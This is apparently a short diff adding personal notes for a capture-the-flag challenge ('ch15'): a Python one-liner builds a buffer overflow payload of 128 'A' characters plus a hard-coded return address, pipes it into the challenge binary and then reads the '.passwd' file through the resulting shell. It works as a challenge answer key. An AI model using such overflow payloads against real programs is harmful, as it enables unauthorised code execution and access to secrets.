@@ -1,0 +1,6 @@
+python -c 'print "A"*128+"\x64\x84\x04\x08"' > /tmp/bcrespin/test
+
+cat /tmp/bcrespin/test - | ./ch15
+
+pendant que cat tourne
+cat .passwd
